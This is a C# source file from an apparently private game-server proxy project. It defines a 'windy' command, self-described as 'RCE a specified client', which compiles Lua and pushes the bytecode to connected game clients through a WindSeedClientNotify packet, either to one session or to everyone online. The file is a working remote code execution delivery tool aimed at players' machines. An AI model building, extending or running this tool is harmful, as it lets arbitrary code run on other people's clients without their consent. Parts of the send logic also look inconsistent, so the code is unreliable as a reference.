using CommandLine;
using csharp_Protoshift.GameSession;
using Google.Protobuf;
using System.Text.Json;
using YYHEggEgg.Logger;

namespace csharp_Protoshift.Commands
{
    [Verb("send", true, HelpText = "execute a lua/luac file.")]
    internal class WindySendConfig
    {
        [Option('t', "target", Default = 0u, Required = false, HelpText = "Specify the target session of sending windy.")]
        public uint Target { get; set; }
        [Option("everyone", Default = false, Required = false, HelpText = "Whether to send the windy to everyone online.")]
        public bool IsEveryone { get; set; }
        [Option('c', "compiled", Default = null, Required = false, HelpText = "The compiled .luac file path.")]
        public string? ForceCompiled { get; set; }
    }

    [Verb("set-env", false, HelpText = "Set a directory as a default location that stores .lua files.")]
    internal class WindySetEnvConfig
    {
        [Value(0, Required = true, HelpText = "The directory path.")]
        public string DirectoryPath { get; set; }
    }

    [Verb("set-luac", false, HelpText = "Set the luac (lua compiler) executable path.")]
    internal class WindySetLuacConfig
    {
        [Value(0, Required = true, HelpText = "The file path.")]
        public string FilePath { get; set; }
    }

    internal class WindyCommand : CommandHandlerBase
    {
        public override string CommandName => "windy";

        public override string Description => "RCE a specified client.";

        public override string Usage => $"windy [command] <args>{Environment.NewLine}" +
            $"  command send (default): execute a lua/luac file. {Environment.NewLine}" +
            $"    windy [-t, --target <conv>] | [--everyone] {Environment.NewLine}" +
            $"          [-c, --compiled <compiled_lua_path>]{Environment.NewLine}" +
            $"      In most cases, you just need to give the path of .lua and windy command will compile it for you. {Environment.NewLine}" +
            $"      If use --compiled, the program will treat it as compiled lua, {Environment.NewLine}" +
            $"      or the behaviour depends on the extension is either .lua or .luac.{Environment.NewLine}" +
            $"{Environment.NewLine}" +
            $"  command set-env: Set a directory as a default location that stores .lua files. {Environment.NewLine}" +
            $"    windy set-env <dir-full-path>{Environment.NewLine}" +
            $"      After this you may invoke windy without path and extension, e.g. windy HideUI{Environment.NewLine}" +
            $"{Environment.NewLine}" +
            $"  command set-luac: Set the luac (lua compiler) executable path.{Environment.NewLine}" +
            $"    windy set-luac <luac-full-path>";

        private WindyLuacManager windyExecute;
        private bool _initFinished = false;
        public const string WindyManagerPath = "windy_config.json";
#pragma warning disable CS8618 // 在退出构造函数时，不可为 null 的字段必须包含非 null 值。请考虑声明为可以为 null。
        public WindyCommand()
#pragma warning restore CS8618 // 在退出构造函数时，不可为 null 的字段必须包含非 null 值。请考虑声明为可以为 null。
        {
            if (File.Exists(WindyManagerPath))
            {
                try
                {
                    var windy = JsonSerializer.Deserialize<WindyLuacManager>(
                        File.ReadAllText(WindyManagerPath));
                    if (windy == null)
                    {
                        Log.Erro($"Read windy config from file: {WindyManagerPath} failed. Using a new instance.", nameof(WindyCommand));
                        InitNewWindyManager();
                        AutoSave = false;
                    }
                    else
                    {
                        windyExecute = windy;
                        Log.Info($"Successfully loaded windy config.", nameof(WindyCommand));
                        AutoSave = true;
                    }
                }
                catch (Exception ex)
                {
                    Log.Erro($"Read windy config from file: {WindyManagerPath} failed. Using a new instance.", nameof(WindyCommand));
                    Log.Erro($"Read exception: {ex}", nameof(WindyCommand));
                    InitNewWindyManager();
                    AutoSave = false;
                }
                finally
                {
                    _initFinished = true;
                }
            }
            else
            {
                InitNewWindyManager();
                AutoSave = true;
            }
            savetimer = new((_) =>
            {
                if (AutoSave) SaveChanges();
            }, null, 0, 60000);
        }

        private void InitNewWindyManager()
        {
            windyExecute = new();
            Task.Run(async () => await windyExecute.TryModifyLuacExecutablePath("luac"));
            _initFinished = true;
        }

        #region Save
        public override void CleanUp()
        {
            savetimer.Dispose();
            SaveChanges();
        }

        private Timer savetimer;
        private object save_lck = new object();
        public void SaveChanges()
        {
            lock (save_lck)
                File.WriteAllText(WindyManagerPath, JsonSerializer.Serialize(windyExecute));
        }

        public bool AutoSave { get; set; }
        #endregion

        public override async Task HandleAsync(string argList)
        {
            if (!_initFinished)
            {
                Log.Info($"Windy luac manager initializing, please wait...", nameof(WindyCommand));
                int elapsed_ms = 0;
                while (!_initFinished && elapsed_ms < 10000)
                {
                    await Task.Delay(500);
                    elapsed_ms += 500;
                }
                if (elapsed_ms >= 10000)
                {
                    Log.Erro($"Waiting initializaing timeout of 10s, please try again later or restart.", nameof(WindyCommand));
                    return;
                }
            }
            var args = ParseAsArgs(argList);
            await Parser.Default.ParseArguments<WindySendConfig, WindySetEnvConfig, WindySetLuacConfig>(args)
                .MapResult(
                    async (WindySendConfig o) => await HandleSendAsync(o),
                    async (WindySetEnvConfig o) => await HandleSetEnvAsync(o),
                    async (WindySetLuacConfig o) => await HandleSetLuacAsync(o),
                    error =>
                    {
                        Log.Erro("Unrecognized command or args detected. Please check your input.", nameof(WindyCommand));
                        ShowUsage();
                        return Task.CompletedTask;
                    });
        }

        #region Commands
        private async Task HandleSendAsync(WindySendConfig opt)
        {
            #region Read param
            uint specifiedconv = opt.Target;
            bool everyonewindy = opt.IsEveryone;
            if (specifiedconv == 0 && !everyonewindy)
            {
                Log.Erro($"Please use a correct windy command!", nameof(WindyCommand));
                return;
            }
            if (!everyonewindy)
            {
                if (!GameSessionDispatch.sessions.ContainsKey(specifiedconv))
                {
                    Log.Erro($"The specified conv: {specifiedconv} is not online!", nameof(WindyCommand));
                    return;
                }
            }
            else if (GameSessionDispatch.sessions.Count <= 0)
            {
                Log.Erro($"There are no sessions online.", nameof(WindyCommand));
                return;
            }
            string filePath = opt.ForceCompiled ?? string.Empty;
            bool compiled = opt.ForceCompiled != null;
            if (File.Exists($"{windyExecute.EnvPath}/{filePath}"))
            {
                filePath = $"{windyExecute.EnvPath}/{filePath}";
            }
            else if (File.Exists($"{windyExecute.EnvPath}/{filePath}.lua"))
            {
                filePath = $"{windyExecute.EnvPath}/{filePath}.lua";
            }
            else if (!File.Exists(filePath) && File.Exists($"{filePath}.lua")) filePath += ".lua";
            else
            {
                Log.Erro($"File: {filePath} found in neither windy env path nor working directory!", nameof(WindyCommand));
                return;
            }
            #endregion
            byte[] lua_compiled;
#if !PROXY_ONLY_SERVER
            NewProtos.WindSeedClientNotify rce_warning = new();
#else
            OldProtos.WindSeedClientNotify rce_warning = new();
#endif
            if (compiled)
            {
                lua_compiled = await File.ReadAllBytesAsync(filePath);
            }
            else
            {
                lua_compiled = await windyExecute.CompileLua(filePath);
            }
            rce_warning.AreaNotify = new();
            rce_warning.AreaNotify.AreaId = 1;
            rce_warning.AreaNotify.AreaType = 1;
            rce_warning.AreaNotify.AreaCode = ByteString.CopyFrom(lua_compiled, 0, lua_compiled.Length);
            #region Confirm
            bool permitted = false;
            FileInfo luafileInfo = new(filePath);
            if (!everyonewindy) permitted = true;
            else if (GameSessionDispatch.sessions.Count <= 1) permitted = true;
            else if (GameSessionDispatch.sessions.Count <= 5)
            {
                Log.Warn($"You are sending WindSeed to every online session " +
                    $"({GameSessionDispatch.sessions.Count} sessions) connected to this server.", nameof(WindyCommand));
                Log.Info($"Running lua info: {WindyLuacManager.GetFileHash(luafileInfo)}", nameof(WindyCommand));
                Log.Warn($"Please carefully check the lua info. " +
                    $"To confirm the execution, type 'y' and press Enter.", nameof(WindyCommand));
                ConsoleWrapper.InputPrefix = "Confirm or cancel> ";
                var res = await ConsoleWrapper.ReadLineAsync();
                permitted = res.Trim().ToLower() == "y";
            }
            else
            {
                Log.Warn($"You are sending WindSeed to every online session " +
                    $"({GameSessionDispatch.sessions.Count} sessions) connected to this server.", nameof(WindyCommand));
                Log.Info($"Running lua info: {WindyLuacManager.GetFileHash(luafileInfo)}", nameof(WindyCommand));
                Log.Warn($"Please carefully check the lua info. To confirm the execution, " +
                    $"type the file name \"{luafileInfo.Name}\" and press Enter.", nameof(WindyCommand));
                ConsoleWrapper.InputPrefix = "Confirm or cancel> ";
                var res = await ConsoleWrapper.ReadLineAsync();
                permitted = res.Trim() == luafileInfo.Name;
            }

            if (!permitted)
            {
                Log.Erro($"User cancelled the windy execute.", nameof(WindyCommand));
                return;
            }
            #endregion
            if (!everyonewindy)
            {
                Program.ProxyServer.SendPacketToClient(specifiedconv,
                    GameSessionDispatch.ConstructPacketSendToClient(
                        specifiedconv, nameof(NewProtos.WindSeedClientNotify), null, rce_warning.ToByteArray()));
                Log.Info($"Successfully sent WindSeed: {luafileInfo.Name} to session {specifiedconv}.", nameof(WindyCommand));
            }
            else
            {
                int total = GameSessionDispatch.sessions.Keys.Count;
                int success = 0;
                foreach (var conv in GameSessionDispatch.sessions.Keys)
                {
                    try
                    {
                        Program.ProxyServer.SendPacketToClient(conv,
                            GameSessionDispatch.ConstructPacketSendToClient(
                                conv, nameof(NewProtos.WindSeedClientNotify), null, lua_compiled));
                        success++;
                    }
                    catch { }
                }
                Log.Info($"Successfully sent WindSeed: {luafileInfo.Name} to {success}/{total} online session(s).", nameof(WindyCommand));
            }
        }

        private Task HandleSetEnvAsync(WindySetEnvConfig opt)
        {
            if (windyExecute.SetEnvPath(opt.DirectoryPath))
                Log.Info($"Successfully set windy env path to {opt.DirectoryPath}.", nameof(WindyCommand));
            else Log.Erro($"Failed to set windy env path to {opt.DirectoryPath}.", nameof(WindyCommand));
            return Task.CompletedTask;
        }

        private async Task HandleSetLuacAsync(WindySetLuacConfig opt)
        {
            if (await windyExecute.TryModifyLuacExecutablePath(opt.FilePath))
                Log.Info($"Successfully set luac path to {opt.FilePath}.", nameof(WindyCommand));
            else Log.Erro($"Failed to set luac path to {opt.FilePath}.", nameof(WindyCommand));
            return;
        }
        #endregion
    }
}
